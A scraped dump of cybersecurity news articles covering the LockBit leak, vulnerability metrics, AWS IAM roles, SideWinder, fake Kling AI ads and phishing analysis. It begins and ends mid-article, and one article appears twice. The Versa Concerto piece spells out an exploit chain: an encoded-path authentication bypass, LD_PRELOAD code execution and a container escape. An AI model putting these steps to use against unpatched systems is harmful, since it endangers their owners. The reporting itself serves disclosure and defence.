hit, despite LockBit’s explicit ban on such attacks.\n\nIn one instance, admin “matrix777” intervened after discovering an affiliate was hacked, suspecting an FBI operation or competitor sabotage, and provided free decryptors though they failed to work.\n\nAccording to SearchLight Cyber Report, this incident, alongside repeated decryptor failures reported by victims, underscores the operational inefficiencies within the Lite program, often leaving victims stranded even after complying with demands.\n\nUnusual Tactics\n\nPerhaps the most bizarre revelation is LockBit’s attempt to recruit victims into its RaaS scheme, advertising the $777 entry fee with messages promising a lavish lifestyle.\n\nWhile some Chinese victims expressed interest, existing affiliates showed little enthusiasm for onboarding new members, reflecting their independent contractor mindset.\n\nIn another unexpected twist, affiliates like “Christopher” offered victims basic security advice post-attack, detailing initial access methods such as phishing and suggesting measures like stronger passwords and network monitoring.\n\nSome even provided tips to evade sanctions during ransom payments by framing transactions as payments to “independent researchers.”\n\nHowever, the leak also exposes the inherent risks for victims, as negotiation records are now public, and successful decryption is never guaranteed.\n\nThis snapshot of LockBit Lite, while limited in scope, paints a picture of a group adapting to reputational damage from Operation Cronos in February 2024 by lowering barriers for new affiliates, even as it grapples with trust issues and operational hiccups within its ranks.\n\nFind this News Interesting!

Organizations with limited resources must make difficult decisions about which vulnerabilities to patch first, often leading to significant security gaps when critical vulnerabilities are overlooked in favor of less impactful ones.\n\nCurrent Solutions and Their Limitations\n\nThe cybersecurity community currently relies on two primary approaches to vulnerability prioritization.\n\nThe Exploit Prediction Scoring System (EPSS) attempts to forecast the probability of vulnerability exploitation, but researchers acknowledge it contains known inaccuracies that can mislead security teams.\n\nAdditionally, the Known Exploited Vulnerabilities (KEV) catalog maintained by CISA provides authoritative information about vulnerabilities being actively exploited, but the researchers caution that these lists may not be comprehensive, potentially missing emerging threats.\n\nThese limitations have created a critical gap in vulnerability management processes that often leads to inefficient resource allocation and potential security exposures.\n\nNew Metric Improved Vulnerability Management\n\nThe proposed LEV metric represents a significant advancement in vulnerability assessment methodology by providing a calculated likelihood that a specific vulnerability has been observed in exploitation activities.\n\nUnlike existing solutions, the LEV metric is designed to work as a complementary tool that addresses the shortcomings of current approaches.\n\n“The proposed likelihood metric may augment EPSS remediation by correcting some inaccuracies and enhance KEV lists by enabling measurements of comprehensiveness,” states Jonathan Spring from CISA, who co-authored the research.\n\nHowever, the researchers emphasize that widespread adoption and effectiveness of the LEV metric will require substantial collaboration with industry partners to provide necessary performance measurements and validation data.\n\nAccording to the Report, The researchers believe that this metric could fundamentally change how organizations approach vulnerability management, allowing security teams to make more informed decisions based on empirical exploitation likelihood rather than theoretical risk scores alone.\n\nAs organizations continue to face an expanding attack surface and increasingly sophisticated threats, tools like the LEV metric may prove essential in maintaining effective cybersecurity postures with limited resources.\n\nFind this News Interesting!

Based on location configurations, incoming requests are routed to either core-service or web-service.\n\nTraefik container\n\nThe application’s AuthenticationFilter class contains a Time-of-Check to Time-of-Use (TOCTOU) vulnerability where the REQUEST_URI undergoes URL decoding during authentication checks, but remains unencoded when processed by controllers.\n\nThis inconsistency allows attackers to bypass authentication using specially crafted URLs containing encoded path traversal characters.\n\nThe exploit leverages paths like /portalapi/v1/users/username/admin;%2fv1%2fping where the semicolon followed by URL-encoded slashes tricks the authentication system.\n\nWhen the system processes this URL for authentication, it decodes the path and misidentifies it as an excluded endpoint, granting unauthorized access.\n\nThis vulnerability exposes sensitive API endpoints that would normally require proper authentication, providing an entry point for further attacks.\n\nChained Exploitation Leads to Remote Code Execution\n\nAfter gaining unauthorized access, attackers can exploit a vulnerable file upload endpoint in the web-service component that allows arbitrary file writes through a race condition vulnerability.\n\nThe authentication bypass serves as the initial entry point in a sophisticated attack chain.\n\nAlthough uploaded files are quickly deleted, researchers demonstrated that precisely timed requests could successfully exploit this window of opportunity.\n\nBy leveraging this file write capability, attackers can employ an LD_PRELOAD technique to achieve remote code execution.\n\nThe exploit involves overwriting /etc/ld.so.preload with a path to a malicious shared object file simultaneously uploaded to /tmp/hook.so.\n\nThis malicious object executes when triggered by periodic system commands, establishing reverse shell access to the container.\n\nFurther escalation to the host system is possible through a critical Docker misconfiguration.\n\nThe container has /usr/bin/ and /bin/ directories mapped directly to the host’s filesystem, allowing attackers to replace system binaries with malicious versions that execute when triggered by scheduled cron jobs like /etc/cron.d/popularity-contest.\n\nCVE Assignments and Temporary Mitigation Measures\n\nAfter multiple unsuccessful attempts to receive patches from Versa, VulnCheck assigned three CVEs to the vulnerabilities: CVE-2025-34025 for the Docker container escape, CVE-2025-34026 for the actuator authentication bypass, and CVE-2025-34027 for the authentication bypass leading to remote code execution.\n\nAccording to the Report, Organizations using Versa Concerto should implement immediate mitigations at their proxy or WAF layer: block requests containing semicolons in URL paths to prevent the authentication bypass, and drop requests with Connection headers containing “X-Real-Ip” values to protect actuator endpoints.\n\nThese temporary measures can reduce exploitation risks while awaiting official patches.\n\nThe disclosure timeline began on February 13, 2025, with researchers providing full details to Versa.\n\nDespite initial acknowledgment and promises of patches by April 7th, no fixes were delivered by the 90-day disclosure deadline on May 13th, 2025.\n\nFind this News Interesting!

A similar flaw has also been unearthed in a popular open-source framework called Ray, which automatically creates a default IAM role (ray-autoscaler-v1) with the AmazonS3FullAccess policy.\n\nWhat's concerning about these IAM roles is that while they are intended for something specific, they could be abused to perform administrative actions and break isolation boundaries between services, effectively allowing an attacker who has a foothold in the environment to move laterally across services.\n\nThese attacks go beyond bucket monopoly attacks, which revolve around a scenario where a threat actor could take advantage of predictable S3 bucket naming patterns to set up buckets in unused AWS regions and ultimately gain control over the contents of the bucket when a legitimate customer starts using services like CloudFormation, Glue, EMR, SageMaker, ServiceCatalog, and CodeStar.\n\n\"In this case, an attacker who gains access to a default service role with AmazonS3FullAccess doesn't even need to guess bucket names remotely,\" the researchers explained.\n\n\"They can use their existing privileges to search the account for buckets used by other services using the naming patterns, modify assets like CloudFormation templates, EMR scripts, and SageMaker resources, and move laterally across services within the same AWS account.\"\n\nPut differently, an IAM role within an AWS account with AmazonS3FullAccess permissions has read/write access to every S3 bucket and modifies various AWS services, effectively turning the role into a powerful method for lateral movement and privilege escalation.\n\nSome of the identified services with the permissive policy are listed below -\n\nIn a hypothetical attack scenario, a threat actor could upload a malicious machine learning model to Hugging Face that, when imported into SageMaker, can result in the execution of arbitrary code, which could then be used to seize control of other AWS services like Glue by injecting a backdoor capable of stealing IAM credentials of the Glue job.\n\nThe adversary could then escalate their privileges within the account, ultimately breaching the entire AWS environment by looking for buckets used by CloudFormation and injecting a malicious template to escalate privileges further.\n\nIn response to the disclosure, AWS has addressed the issues by modifying the AmazonS3FullAccess policy for default service roles.\n\n\"Default service roles must be tightly scoped and strictly limited to the specific resources and actions they require,\" the researchers said. \"Organizations should proactively audit and update existing roles to minimize risk, rather than relying on default configurations.\"\n\nThe findings come as Varonis detailed a vulnerability in a utility used for mounting Azure Storage that comes preinstalled on Microsoft Azure AI and High-Performance Computing (HPC) workloads and allows an unprivileged user on a Linux machine with this utility installed to escalate their privileges to root.\n\n\"It involves a classic privilege escalation method involving a SUID binary that is part of the installation of AZNFS-mount, a utility for mounting Azure Storage Account NFS endpoints,\" security researcher Tal Peleg said.\n\n\"For example, a user could elevate permissions to root and use those permissions to mount additional Azure Storage containers, install malware or ransomware on the machine, and attempt to move laterally in the network or cloud environments.\"\n\nThe flaw, which affects all versions of the utility up to 2.0.10, has been addressed in version 2.0.11 released on January 30, 2025.",

        "content": "날짜: May 20, 2025\n\n본문:\nIn the newly released 2025 State of Pentesting Report, Pentera surveyed 500 CISOs from global enterprises (200 from within the USA) to understand the strategies, tactics, and tools they use to cope with the thousands of security alerts, the persisting breaches and the growing cyber risks they have to handle. The findings reveal a complex picture of progress, challenges, and a shifting mindset about how enterprises approach security testing.\n\nOver the past year, 45% of enterprises expanded their security technology stacks, with organizations now managing an average of 75 different security solutions​.\n\nYet despite these layers of security tools, 67% of U.S. enterprises experienced a breach in the past 24 months​. The growing number of deployed tools has a few effects on the daily operation and the overall cyber posture of the organization.\n\nAlthough it seems obvious, the findings tell a clear story - more security tools do mean better security posture. However, there is no silver bullet. Among organizations with fewer than 50 security tools, 93% reported a breach. That percentage steadily declines as stack size increases, dropping to 61% among those using more than 100 tools.\n\nThe flip side of larger security stacks is that CISOs and their teams must contend with a much larger influx of information. Enterprises managing over 75 security solutions now face an average of 2,000 alerts per week — double the volume compared to organizations with smaller stacks, and those with over 100 tools receive over 3000 (3x the alerts).\n\nThis in turn, puts much more emphasis on effective prioritization, otherwise, critical threats may get buried in a sea of alerts. In this environment, where alert volumes are high and time to triage is short, organizations benefit most when they can frequently test for exploitable gaps, so they know which issues truly matter before threat actors find them first.\n\nTrust in software-based security testing is growing rapidly. Only 5-10 years ago, many enterprises would never have permitted automated tools to run pentests in their environments for fear of causing outages, but sentiment is changing.\n\nAs CISOs continue to recognize the advantages of software in scaling adversarial testing and keeping pace with constantly changing IT environments, software-based pentesting is becoming the standard. Over half of enterprises now use these tools to support in-house testing, driven by trust in their reliability and the need for scalable, continuous validation strategies. Today, 50% of CISOs cite software-based pentesting solutions as their primary method for uncovering exploitable gaps​.\n\nBeyond internal management and Boards of Directors, a surprising new force is shaping security strategy: Cyber insurance providers. 59% of CISOs admitted that they have implemented at least one cybersecurity solution that they were not previously considering as a result of their cyber insurers. It's a clear sign that insurers aren't just pricing risk, they're actively prescribing how to reduce it, and reshaping enterprise security priorities in the process.​.\n\nWhile governmental agencies like CISA (in the US) and ENISA (in the EU) play an important role in threat visibility and coordination, confidence in government cybersecurity support is surprisingly low.\n\nOnly 14% of CISOs believe the government is adequately supporting the private sector's cyber challenges​, while 64% feel that government efforts, though acknowledged, are insufficient​. 22% believe that they cannot rely on the government at all for cybersecurity help.\n\nTo benchmark your organization's pentesting practices, budgets, and priorities against other global enterprises, register for the webinar on May 27, 2025 where senior security analysts will discuss the key findings. Alternatively, get the full 2025 State of Pentesting Report and see all the insights for yourself!\n\nNote: This article was written and contributed by Jay Mar Tang, Field CISO at Pentera.",

        "content": "날짜: May 20, 2025\n\n본문:\nCybersecurity researchers have discovered risky default identity and access management (IAM) roles impacting Amazon Web Services that could open the door for attackers to escalate privileges, manipulate other AWS services, and, in some cases, even fully compromise AWS accounts.\n\n\"These roles, often created automatically or recommended during setup, grant overly broad permissions, such as full S3 access,\" Aqua researchers Yakir Kadkoda and Ofek Itach said in an analysis. \"These default roles silently introduce attack paths that allow privilege escalation, cross-service access, and even potential account compromise.\"\n\nThe cloud security firm said it identified security issues in default IAM roles created by AWS services like SageMaker, Glue, EMR, and Lightsail. A similar flaw has also been unearthed in a popular open-source framework called Ray, which automatically creates a default IAM role (ray-autoscaler-v1) with the AmazonS3FullAccess policy.\n\nWhat's concerning about these IAM roles is that while they are intended for something specific, they could be abused to perform administrative actions and break isolation boundaries between services, effectively allowing an attacker who has a foothold in the environment to move laterally across services.\n\nThese attacks go beyond bucket monopoly attacks, which revolve around a scenario where a threat actor could take advantage of predictable S3 bucket naming patterns to set up buckets in unused AWS regions and ultimately gain control over the contents of the bucket when a legitimate customer starts using services like CloudFormation, Glue, EMR, SageMaker, ServiceCatalog, and CodeStar.\n\n\"In this case, an attacker who gains access to a default service role with AmazonS3FullAccess doesn't even need to guess bucket names remotely,\" the researchers explained.\n\n\"They can use their existing privileges to search the account for buckets used by other services using the naming patterns, modify assets like CloudFormation templates, EMR scripts, and SageMaker resources, and move laterally across services within the same AWS account.\"\n\nPut differently, an IAM role within an AWS account with AmazonS3FullAccess permissions has read/write access to every S3 bucket and modifies various AWS services, effectively turning the role into a powerful method for lateral movement and privilege escalation.\n\nSome of the identified services with the permissive policy are listed below -\n\nIn a hypothetical attack scenario, a threat actor could upload a malicious machine learning model to Hugging Face that, when imported into SageMaker, can result in the execution of arbitrary code, which could then be used to seize control of other AWS services like Glue by injecting a backdoor capable of stealing IAM credentials of the Glue job.\n\nThe adversary could then escalate their privileges within the account, ultimately breaching the entire AWS environment by looking for buckets used by CloudFormation and injecting a malicious template to escalate privileges further.\n\nIn response to the disclosure, AWS has addressed the issues by modifying the AmazonS3FullAccess policy for default service roles.\n\n\"Default service roles must be tightly scoped and strictly limited to the specific resources and actions they require,\" the researchers said. \"Organizations should proactively audit and update existing roles to minimize risk, rather than relying on default configurations.\"\n\nThe findings come as Varonis detailed a vulnerability in a utility used for mounting Azure Storage that comes preinstalled on Microsoft Azure AI and High-Performance Computing (HPC) workloads and allows an unprivileged user on a Linux machine with this utility installed to escalate their privileges to root.\n\n\"It involves a classic privilege escalation method involving a SUID binary that is part of the installation of AZNFS-mount, a utility for mounting Azure Storage Account NFS endpoints,\" security researcher Tal Peleg said.\n\n\"For example, a user could elevate permissions to root and use those permissions to mount additional Azure Storage containers, install malware or ransomware on the machine, and attempt to move laterally in the network or cloud environments.\"\n\nThe flaw, which affects all versions of the utility up to 2.0.10, has been addressed in version 2.0.11 released on January 30, 2025.",

It's worth pointing out that the modus operandi is consistent with recent SideWinder attacks documented by Kaspersky in March 2025.\n\nSome of the targets of the campaign, per Acronis, include Bangladesh's Telecommunication Regulatory Commission, Ministry of Defence, and Ministry of Finance; Pakistan's Directorate of Indigenous Technical Development; and Sri Lanka's Department of External Resources, Department of Treasury Operations, Ministry of Defence, and Central Bank.\n\nThe attacks are characterized by the use of years-old remote code execution flaws in Microsoft Office (CVE-2017-0199 and CVE-2017-11882) as initial vectors to deploy malware capable of maintaining persistent access in government environments across South Asia.\n\nThe malicious documents, when opened, trigger an exploit for CVE-2017-0199 to deliver next-stage payloads that are responsible for installing StealerBot by means of DLL side-loading techniques.\n\nOne noteworthy tactic adopted by SideWinder is that the spear-phishing emails are coupled with geofenced payloads to ensure that only victims meeting the targeting criteria are served the malicious content. In the event the victim's IP address does not match, an empty RTF file is sent instead as a decoy.\n\nThe malicious payload is an RTF file that weaponizes CVE-2017-11882, a memory corruption vulnerability in the Equation Editor, to launch a shellcode-based loader that runs the StealerBot malware.\n\nStealerBot, according to Kaspersky, is a .NET implant that's engineered to drop additional malware, launch a reverse shell, and collect a wide range of data from compromised hosts, including screenshots, keystrokes, passwords, and files.\n\n\"SideWinder has demonstrated consistent activity over time, maintaining a steady pace of operations without prolonged inactivity — a pattern that reflects organizational continuity and sustained intent,\" the researchers said.\n\n\"A closer analysis of their tactics, techniques, and procedures (TTPs) reveals a high degree of control and precision, ensuring that malicious payloads are delivered only to carefully selected targets, and often only for a limited time.\"",

        "title": "Why CTEM is the Winning Bet for CISOs in 2025",
        "content": "날짜: May 19, 2025\n\n본문:\nContinuous Threat Exposure Management (CTEM) has moved from concept to cornerstone, solidifying its role as a strategic enabler for CISOs. No longer a theoretical framework, CTEM now anchors today's cybersecurity programs by continuously aligning security efforts with real-world risk.\n\nAt the heart of CTEM is the integration of Adversarial Exposure Validation (AEV), an advanced, offensive methodology powered by proactive security tools including External Attack Surface Management (ASM), autonomous penetration testing and red teaming, and Breach and Attack Simulation (BAS). Together, these AEV tools transform how enterprises proactively identify, validate, and reduce risks, turning threat exposure into a manageable business metric.\n\nCTEM reflects a broader evolution in how security leaders measure effectiveness and allocate resources. As board expectations grow and cyber risk becomes inseparable from business risk, CISOs are leveraging CTEM to drive measurable, outcome-based security initiatives. Early adopters report improved risk visibility, faster validation and remediation cycles, and tighter alignment between security investments and business priorities.1 With tools like ASM and autonomous pentesting delivering real-time insights into exposure, CTEM empowers CISOs to adopt a continuous, adaptive model that keeps pace with attacker techniques and the evolving threat landscape.\n\nCTEM introduces a continuous, iterative process encompassing three pillars: Adversarial Exposure Validation (AEV), Exposure Assessment Platforms (EAP), and Exposure Management (EM). These methodologies ensure enterprises can dynamically assess and respond to threats, aligning security efforts with business objectives.1 Gartner underscores the significance of CTEM, predicting that by 2026, organizations prioritizing security investments based on a CTEM program will be three times less likely to suffer a breach.2\n\nAEV strengthens CTEM by continuously validating the effectiveness of security controls through the simulated exploitation of assets using real-world attacker behaviors. This often involves the use of automation, AI, and machine learning to replicate tactics, techniques, and procedures (TTPs) used by adversaries, helping enterprises to proactively identify exploitable exposures before they can be leveraged in an actual attack. This proactive approach is crucial in understanding weaknesses and refining defenses more effectively.\n\nASM complements CTEM by providing comprehensive visibility into an enterprise's digital footprint. By continuously discovering, prioritizing, and monitoring assets, ASM enables security teams to identify potential vulnerabilities and exposures promptly. This expanded visibility is essential for effective threat exposure management, ensuring that no asset remains unmonitored. AEV transforms ASM from a map into a mission plan, and enterprises need it urgently.\n\nThe integration of autonomous penetrating testing and red teaming into CTEM frameworks marks a significant advancement in cybersecurity practices. Autonomous pentesting, for example, delivers real-time, scalable, and actionable insights unlike periodic assessments. This shift enhances operational efficiency while proactively identifying and mitigating vulnerabilities in real-time. While regulatory compliance remains important, it is no longer the sole driver – modern mandates increasingly emphasize continuous, proactive security testing.\n\nBAS tools also play a role in CTEM by automating the simulation of known attack techniques across the kill chain – ranging from phishing and lateral movement to data exfiltration. Unlike autonomous pentesting, which actively exploits vulnerabilities, BAS focuses on continuously validating the effectiveness of security controls without causing disruption. These simulated attacks help uncover blind spots, misconfigurations, and detection and response gaps across endpoints, networks, and cloud environments. By aligning results with threat intelligence and frameworks like MITRE ATT&CK, BAS enables security teams to prioritize remediation based on real exposure and risk, helping CISOs ensure their defenses are not only in place, but operationally effective.\n\nThe rapid adoption of CTEM in 2025 is no coincidence. As cyber risks grow more complex and dynamic, enterprises are embracing CTEM not just as a framework, but as an effective cyber strategy that yields measurable results. Several converging trends, ranging from evolving threat tactics to regulatory pressure and expanding digital footprints, are driving security leaders to prioritize continuous validation, real-time visibility, and operational efficiency across the attack surface. Several factors contribute to the widespread adoption of CTEM:\n\nCybersecurity cannot evolve by standing still, and neither can security leaders and their organizations. The shift toward a proactive, measurable, and continuous approach to threat exposure is not only necessary but achievable. In fact, it's the only viable path forward. CTEM isn't just another framework, it's a blueprint for transforming security into a business-aligned, data-driven discipline. By embracing real-time validation, prioritizing exposures that matter, and proving effectiveness with metrics that resonate beyond the SOC, CISOs are moving the industry beyond checkboxes toward true resilience. Today, the enterprises that lead in cybersecurity will be the ones that measure it and manage it, continuously.\n\nAbout BreachLock:\n\nBreachLock is a leader in offensive security, delivering scalable and continuous security testing.

        "content": "날짜: May 19, 2025\n\n본문:\nCybersecurity leaders aren't just dealing with attacks—they're also protecting trust, keeping systems running, and maintaining their organization's reputation. This week's developments highlight a bigger issue: as we rely more on digital tools, hidden weaknesses can quietly grow.\n\nJust fixing problems isn't enough anymore—resilience needs to be built into everything from the ground up. That means better systems, stronger teams, and clearer visibility across the entire organization. What's showing up now isn't just risk—it's a clear signal that acting fast and making smart decisions matters more than being perfect.\n\nHere's what surfaced—and what security teams can't afford to overlook.\n\nMicrosoft Fixes 5 Actively Exploited 0-Days — Microsoft addressed a total of 78 security flaws in its Patch Tuesday update for May 2025 last week, out of which five of them have come under active exploitation in the wild. The vulnerabilities include CVE-2025-30397, CVE-2025-30400, CVE-2025-32701, CVE-2025-32706, and CVE-2025-32709. It's currently not known in what context these defects have been exploited, who is behind them, and who was targeted in these attacks.\n\nIn cloud-native environments, the security of your code repositories and development pipelines is critical. Do you know the most pressing risks facing your organization today? By analyzing hundreds of thousands of repositories, the Wiz Threat Research team uncovered key vulnerabilities and attacker strategies in the new 2025 State of Code Security Report.\n\nKey stats include:\n\nDownload the report to explore all the findings in detail and learn actionable strategies to protect your organization.\n\nAttackers love software vulnerabilities—they're easy doors into your systems. Every week brings fresh flaws, and waiting too long to patch can turn a minor oversight into a major breach. Below are this week's critical vulnerabilities you need to know about. Take a look, update your software promptly, and keep attackers locked out.\n\nThis week's list includes — CVE-2025-30397, CVE-2025-30400, CVE-2025-32701, CVE-2025-32706, CVE-2025-32709 (Microsoft Windows), CVE-2025-42999 (SAP NetWeaver), CVE-2024-11182 (MDaemon), CVE-2025-4664 (Google Chrome), CVE-2025-4632 (Samsung MagicINFO 9 Server), CVE-2025-32756 (Fortinet FortiVoice, FortiMail, FortiNDR, FortiRecorder, and FortiCamera), CVE-2025-4427, CVE-2025-4428 (Ivanti Endpoint Manager Mobile), CVE-2025-3462, CVE-2025-3463 (ASUS DriverHub), CVE-2025-47729 (TeleMessage TM SGNL), CVE-2025-31644 (F5 BIG-IP), CVE-2025-22249 (VMware Aria Automation), CVE-2025-27696 (Apache Superset), CVE-2025-4317 (TheGem WordPress theme), CVE-2025-23166 (Node.js), CVE-2025-47884 (Jenkins OpenID Connect Provider Plugin), CVE-2025-47889 (Jenkins WSO2 Oauth Plugin), CVE-2025-4802 (Linux glibc), and CVE-2025-47539 (Eventin plugin).\n\nModern applications don't live in one place—they span code, cloud, and runtime. Yet security is still siloed. This webinar shows why securing just the code isn't enough. You'll learn how unifying AppSec, cloud, and SOC teams can close critical gaps, reduce response times, and stop attacks before they spread. If you're still treating dev, infra, and operations as separate problems, it's time to rethink.\n\nCatch Hidden Threats in Files Users Trust Too Much → Hackers are using a quiet but dangerous trick: hiding malicious code inside files that look safe — like desktop shortcuts, installer files, or web links. These aren't classic malware files. Instead, they run trusted apps like PowerShell or curl in the background, using basic user actions (like opening a file) to silently infect systems. These attacks often go undetected because the files seem harmless, and no exploits are used — just misuse of normal features.\n\nTo detect this, focus on behavior. For example, .desktop files in Linux that run hidden shell commands, .lnk files in Windows launching PowerShell or remote scripts, or macOS .app files silently calling terminal tools. These aren't rare anymore — attackers know defenders often ignore these paths. They're especially dangerous because they don't need admin rights and are easy to hide in shared folders or phishing links.\n\nYou can spot these threats using free tools and simple rules. On Windows, use Sysmon and Sigma rules to alert on .lnk files starting PowerShell or suspicious child processes from explorer.exe. On Linux or macOS, use grep or find to scan .desktop and .plist files for odd execution patterns. To test your defenses, simulate these attack paths using MITRE CALDERA — it's free and lets you safely model real-world attacker behavior. Focusing on these overlooked execution paths can close a major gap attackers rely on every day.\n\nThe headlines may be over, but the work isn't. Whether it's rechecking assumptions, prioritizing patches, or updating your response playbooks, the right next step is rarely dramatic—but always decisive. Choose one, and move with intent.",

        "title": "Securing CI/CD workflows with Wazuh",
        "content": "날짜: May 21, 2025\n\n본문:\nContinuous Integration and Continuous Delivery/Deployment (CI/CD) refers to practices that automate how code is developed and released to different environments. CI/CD pipelines are fundamental in modern software development, ensuring code is consistently tested, built, and deployed quickly and efficiently.\n\nWhile CI/CD automation accelerates software delivery, it can also introduce security risks. Without proper security measures, CI/CD workflows can be vulnerable to supply chain attacks, insecure dependencies, and insider threats. To mitigate these risks, organizations must integrate measures for continuous monitoring and enforcing security best practices at every pipeline stage. Securing CI/CD workflows preserves the software delivery process's confidentiality, integrity, and availability.\n\nWhile CI/CD workflows offer benefits in terms of automation and speed, they also bring unique security challenges that must be addressed to maintain the integrity of the development process. Some common challenges and risks include:\n\nWazuh is an open source security platform that offers unified XDR and SIEM capabilities for on-premises, containerized, virtualized, and cloud-based environments. Wazuh provides flexibility in threat detection, compliance, incident handling, and third-party integration. Organizations can implement Wazuh to address the challenges and mitigate the risks associated with CI/CD workflow security. Below are some ways Wazuh helps improve security in CI/CD workflows.\n\nWazuh provides log collection and analysis capabilities to ensure the components of your CI/CD environment are continuously monitored for security threats. It collects and analyzes logs from various CI/CD pipeline components, including servers, containerization and orchestration tools such as Docker and Kubernetes, and version control systems like GitHub. This allows security teams to monitor for unusual activities, unauthorized access, or security breaches across the CI/CD environment.\n\nAdditionally, the Wazuh File Integrity Monitoring (FIM) capability can detect unauthorized changes in code or configuration files. By monitoring files in real time or on a schedule, Wazuh generates alerts for security teams about file activities like creation, deletion, or modification.\n\nWazuh allows users to create custom rules and alerts that align with a pipeline's security requirements. Organizations can create custom rules matching their specific security needs, such as monitoring code changes, server configurations, or container images. This flexibility allows organizations to enforce granular security controls tailored to their CI/CD workflow.\n\nFor instance, the Center for Internet Security (CIS) Docker Benchmark provides guidelines for securing Docker environments. Organizations can automate the compliance checks against CIS Docker Benchmark v1.7.0 using the Wazuh Security Configuration Assessment (SCA) capability.\n\nWazuh can integrate with various security tools and platforms, including container vulnerability scanners and CI/CD orchestration systems. This is particularly important in CI/CD workflows, where multiple tools may be used to manage the development lifecycle. Wazuh can pull in data from various sources, which helps to provide a centralized view of security across the pipeline.\n\nFor instance, Wazuh integrates with container vulnerability scanning tools Trivy and Grype, which are commonly used to scan container images for vulnerabilities, insecure base images, or outdated software versions. By scanning container images before they are deployed into production, organizations can ensure that only secure, up-to-date images are used in the deployment processes.\n\nYou can configure the Wazuh Command module to run a Trivy scan on an endpoint hosting container images and display any detected vulnerabilities in the Wazuh dashboard. This helps to ensure that insecure images are identified and prevented from being pushed into production.\n\nThe speed of CI/CD workflows means that threats must be detected and mitigated quickly to minimize the risk of breaches or downtime. Wazuh provides incident response capabilities that help organizations respond to security incidents as soon as they occur.\n\nThe Wazuh Active Response module can automatically take action when a security threat is detected. For example, suppose a malicious IP address is detected trying to access a system that runs CI/CD processes. In that case, Wazuh can automatically block the IP address and trigger predefined remediation actions. This automation ensures fast response, reduces manual intervention, and prevents potential threats from escalating.\n\nSecuring CI/CD workflows is important for maintaining a reliable and safe software development process. By using Wazuh, organizations can detect vulnerabilities early, monitor for anomalies, enforce compliance, and automate security responses while maintaining the speed and efficiency of CI/CD workflows. Integrating Wazuh into your CI/CD workflow ensures that security keeps pace with development speed.",

        "title": "Fake Kling AI Facebook Ads Deliver RAT Malware to Over 22 Million Potential Victims",
        "content": "날짜: May 21, 2025\n\n본문:\nCounterfeit Facebook pages and sponsored ads on the social media platform are being employed to direct users to fake websites masquerading as Kling AI with the goal of tricking victims into downloading malware.\n\nKling AI is an artificial intelligence (AI)-powered platform to synthesize images and videos from text and image prompts. Launched in June 2024, it's developed by Kuaishou Technology, which is headquartered in Beijing, China. As of April 2025, the service has a user base of more than 22 million, per data from the company.\n\n\"The attack used fake Facebook pages and ads to distribute a malicious file which ultimately led to the execution of a remote access Trojan (RAT), granting attackers remote control of the victim's system and the ability to steal sensitive data,\" Check Point said.\n\nFirst detected in early 2025, the campaign leads unsuspecting users to a spoofed website such as klingaimedia[.]com or klingaistudio[.]com, where they are asked to create AI-generated images or videos directly in the browser.\n\nHowever, the website does not generate the multimedia count as advertised. Rather, it offers the option to a purported image or video that, in reality, is a malicious Windows executable hidden using double extensions and Hangul Filler (0xE3 0x85 0xA4) characters.\n\nThe payload is included in a ZIP archive and acts as a loader to launch a remote access trojan and a stealer that then establishes contact with a command-and-control (C2) server and exfiltrates browser-stored credentials, session tokens, and other sensitive data.\n\nThe loader, besides monitoring for analysis tools such as Wireshark, OllyDbg, Procmon, ProcExp, PeStudio, and Fiddler, makes Windows Registry changes to set up persistence and launches the second-stage by injecting it into a legitimate system process like \"CasPol.exe\" or \"InstallUtil.exe\" to evade detection.\n\nThe second-stage payload, obfuscated using .NET Reactor, is the PureHVNC RAT that contacts a remote server (185.149.232[.]197) and comes with capabilities to steal data from several cryptocurrency wallet extensions installed on Chromium-based browsers. PureHVNC also adopts a plugin-based approach to capture screenshots when window titles matching banks and wallets are opened.\n\nCheck Point said it identified no less than 70 promoted posts from fake social media pages impersonating Kling AI. It's currently not clear who is behind the campaign, but evidence gathered from the fake website's web page and some of the ads show that they could be from Vietnam.\n\nThe use of Facebook malvertising techniques to distribute stealer malware has been a tried-and-tested tactic of Vietnamese threat actors, who have been increasingly capitalizing on the popularity of generative AI tools to push malware.\n\nEarlier this month, Morphisec revealed that a Vietnamese threat actor has been leveraging fake AI-powered tools as a lure to entice users into downloading an information stealer malware dubbed Noodlophile.\n\n\"This campaign, which impersonated Kling AI through fake ads and deceptive websites, demonstrates how threat actors are combining social engineering with advanced malware to gain access to users' systems and personal data,\" Check Point said.\n\n\"With tactics ranging from file masquerading to remote access and data theft, and signs pointing to Vietnamese threat groups, this operation fits into a broader trend of increasingly targeted and sophisticated social media-based attacks.\"\n\nThe development comes as The Wall Street Journal reported that Meta is battling an \"epidemic of scams,\" with cyber criminals flooding Facebook and Instagram with various kinds of scams ranging from romance baiting to sketchy bargain ads to fake giveaways. Many of the scam pages are operated from China, Sri Lanka, Vietnam, and the Philippines, the report added.\n\nAccording to Rest of World, phony job ads on Telegram, Facebook, and other social media are being increasingly used to lure young Indonesians and get trafficked to scam compounds in Southeast Asia, from where they are coerced into running investment scams and defraud victims across the world.",

        "title": "How to Detect Phishing Attacks Faster: Tycoon2FA Example",
        "content": "날짜: May 21, 2025\n\n본문:\nIt takes just one email to compromise an entire system. A single well-crafted message can bypass filters, trick employees, and give attackers the access they need. Left undetected, these threats can lead to credential theft, unauthorized access, and even full-scale breaches. As phishing techniques become more evasive, they can no longer be reliably caught by automated solutions alone.\n\nLet's take a closer look at how SOC teams can ensure fast, accurate detection of even the most evasive phishing attacks, using the example of Tycoon2FA, the number one phishing threat in the corporate environment today.\n\nLet's consider a typical situation: a suspicious email gets flagged by your detection system, but it's unclear whether it's indeed malicious.\n\nThe fastest way to check it is to run a quick analysis inside a malware sandbox.\n\nA sandbox is an isolated virtual machine where you can safely open files, click links, and observe behavior without putting your own system at risk. It's how SOC analysts investigate malware, phishing attempts, and suspicious activity without triggering anything locally.\n\nGetting started is easy. Upload the file or paste a URL, pick your OS (Windows, Linux, or Android), tweak your settings if needed, and within seconds, you're inside a fully interactive virtual machine ready to investigate.\n\nTo show how easy it is to detect phishing, let's walk through a real-world example, a potential phishing email we analyzed using ANY.RUN, is one of the fastest and most intuitive sandboxes available.\n\nView the phishing sample here\n\nThe suspicious email includes a large green \"Play Audio\" button, a trick used to lure the victim into clicking.\n\nEquip your SOC team with a fast and in-depth phishing analysis service to respond to and prevent incidents in seconds.\n\nGet a special offer before May 31\n\nWith the help of sandboxes like ANY.RUN, it's possible to detonate every single stage of an attack, from the first click to the final payload. Even junior SOC members can do it with ease. The interface is intuitive, interactive, and built to make complex analysis feel simple.\n\nIn our phishing example, we've already seen how the attack begins; a suspicious email with a big green \"Play Audio\" button buried in a thread. But what happens after the 